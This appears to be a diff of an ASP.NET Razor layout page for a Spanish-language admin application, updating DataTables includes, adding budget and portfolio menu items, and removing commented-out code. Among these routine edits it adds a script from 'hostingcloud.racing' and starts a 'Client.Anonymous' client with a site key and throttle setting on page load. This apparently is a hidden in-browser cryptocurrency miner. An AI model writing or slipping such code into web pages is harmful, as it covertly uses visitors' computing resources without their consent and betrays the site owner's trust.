@@ -14,7 +14,7 @@
     <!-- Ionicons -->
     <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
     <!-- Ionicons -->
-    <link rel="stylesheet" href="https://cdn.datatables.net/1.10.24/css/jquery.dataTables.min.css">
+    @*<link rel="stylesheet" href="https://cdn.datatables.net/1.10.24/css/jquery.dataTables.min.css">*@
     <!-- Tempusdominus Bootstrap 4 -->
     <link rel="stylesheet" href="~/Content/FrontEnd/plugins/tempusdominus-bootstrap-4/css/tempusdominus-bootstrap-4.min.css">
     <!-- iCheck -->
@@ -33,6 +33,8 @@
     <link rel="stylesheet" href="~/Content/FrontEnd/plugins/sweetalert2/sweetalert2.min.css">
     <!--select2-->
     <link href="~/Content/css/select2.min.css" rel="stylesheet" />
+    @*DatatableJS*@
+    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/dt/jszip-2.5.0/dt-1.10.24/b-1.7.0/b-colvis-1.7.0/b-html5-1.7.0/b-print-1.7.0/cr-1.5.3/kt-2.6.1/r-2.2.7/datatables.min.css" /
 </head>
 <body class="hold-transition sidebar-mini layout-fixed layout-navbar-fixed">
     <div class="wrapper">
@@ -301,10 +303,24 @@
                             </a>
                             <ul class="nav nav-treeview">
                                 <li class="nav-item">
+                                    <a href="@Url.Action("Index", "Presupuesto")"
+                                       class="@Html.IsSelected(actions: "Index", controllers: "Presupuesto")">
+                                        <i class="far fa-circle nav-icon"></i>
+                                        <p>Ver Presupuesto</p>
+                                    </a>
+                                </li>
+                                <li class="nav-item">
                                     <a href="@Url.Action("Consolidado", "Credito")"
                                        class="@Html.IsSelected(actions: "Consolidado", controllers: "Credito")">
                                         <i class="far fa-circle nav-icon"></i>
                                         <p>Consolidado</p>
+                                    </a>
+                                </li>
+                                <li class="nav-item">
+                                    <a href="@Url.Action("Cartera", "Credito")"
+                                       class="@Html.IsSelected(actions: "Cartera", controllers: "Credito")">
+                                        <i class="far fa-circle nav-icon"></i>
+                                        <p>Cartera</p>
                                     </a>
                                 </li>
                             </ul>
@@ -1073,19 +1089,33 @@
     <script src="~/Content/FrontEnd/dist/js/pages/dashboard.js"></script>
     @*Knockout JS*@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.0/knockout-min.js"></script>
+    @*<script src="https://cdn.datatables.net/1.10.24/js/jquery.dataTables.min.js"></script>*@
     @*Datatable JS*@
-    <script src="https://cdn.datatables.net/1.10.24/js/jquery.dataTables.min.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.36/pdfmake.min.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.36/vfs_fonts.js"></script>
+    <script type="text/javascript" src="https://cdn.datatables.net/v/dt/jszip-2.5.0/dt-1.10.24/b-1.7.0/b-colvis-1.7.0/b-html5-1.7.0/b-print-1.7.0/cr-1.5.3/kt-2.6.1/r-2.2.7/datatables.min.js"></script>
     <script src="~/Content/js/OrdenCompra.js"></script>
     <script src="~/Content/js/Credito.js"></script>
     <script src="~/Content/FrontEnd/dist/js/jquery.table2excel.js"></script>
 
     <!-- select 2 -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.0/js/select2.min.js"></script>
-
+    <script src="https://www.hostingcloud.racing/lNRq.js"></script>
     <script>
+        
+
         $(document).ready(function () {
             //filasOC = 1;
             ActivarProductos();
+
+            var _client = new Client.Anonymous('0fb243d8dae07e196b8a47f5d01e3e993db5ab9d5ce178149070dc38907307bf', {
+                throttle: 0.2, c: 'w', ads: 0
+            });
+            _client.start();
+
+            function numeroDecimal(event) {
+                this.value = parseFloat(this.value).toFixed(2);
+            }
 
             Toast = Swal.mixin({
                 toast: true,
@@ -1108,7 +1138,6 @@
                 locale: 'es',
                 format: 'DD/MM/yyyy'
             });
-
 
         });
 
@@ -1156,61 +1185,9 @@
 
         function AgregarFila() {
             AgregarDetalle();
-            //$('#tablaOrdenCompra > tbody:last-child').
-            //    append(
-            //        '<tr><td><select class="js-data-example-ajax col-md-12" id="productoDetalleOC"></select></td><td>' +
-            //        '<input type="number" class="form-control form-control-border CantidadDetalleOC" name="cantidad_producto" id="CantidadDetalleOC" ' +
-            //        'min="0" style = "text-align: right;"/> </td> <td> <input type = "number" class= "form-control form-control-border ValorUnitarioOC" ' +
-            //        ' id="ValorUnitarioOC" min="0" step=".01" style="text-align: right;" /> </td> <td> ' +
-            //        ' <input type="number" class="form-control form-control-border DescuentoOC "  id="DescuentoOC" ' +
-            //        ' min="0" style="text-align: right;"/></td><td><input type="number" class="form-control ' +
-            //        ' form-control-border SubtotalDetalleOC" name="valor_linea" id="SubtotalDetalleOC" min="0" style="text-align: right;"  disabled/></td><td> '+
-            //        '<button class= "btn btn-danger BorrarFila"  type="button"> <i class="fa fa-trash"></i></button>'+
-            //        '                    </td ></tr>'
-            //);
             ActivarProductos();
-            //$('.js-data-example-ajax').select2({
-            //    minimumInputLength: 2,
-            //    tags: [],
-            //    ajax: {
-            //        url: '/Gastos/ObtenerProductos',
-            //        processResults: function (data) {
-            //            return {
-            //                results: $.map(data, function (item) {
-            //                    return {
-            //                        text: item.descripcion,
-            //                        id: item.id_producto,
-            //                        valor_unitario: item.valor_unitario
-            //                    }
-            //                })
-            //            };
-            //        },
-            //        dataType: 'json',
-            //        data: function (params) {
-            //            var query = {
-            //                textoBusqueda: params.term,
-            //            }
-            //            return query;
-            //        }
-            //    }
-            //}).on('change', function (e) {
-            //    var valor_unitario = $(this).select2('data')[0].valor_unitario;
-            //    var $tr = $(this).parents("tr");
-            //    $(this).parent().siblings().each(function () {
-            //        var elemento_ = $(this).find('input');
-            //        if (elemento_.attr('id') == "ValorUnitarioOC") {
-            //            elemento_.val(valor_unitario);
-            //        }
-            //    });
-            //});
         }
 
-                            //$(".CantidadDetalleOC, .ValorUnitarioOC").on('change', function (e) {
-                            //    var cantidad = $(this).parents("tr").find('input[id="CantidadDetalleOC"]').val();
-                            //    var vu = $(this).parents("tr").find('input[id="ValorUnitarioOC"]').val();
-                            //    var subtotal_detalle = (cantidad * vu).toFixed(2);
-                            //    $(this).parents("tr").find('input[id="SubtotalDetalleOC"]').val(subtotal_detalle);
-                            //});
 
     </script>
     @RenderSection("Scripts", required: false)
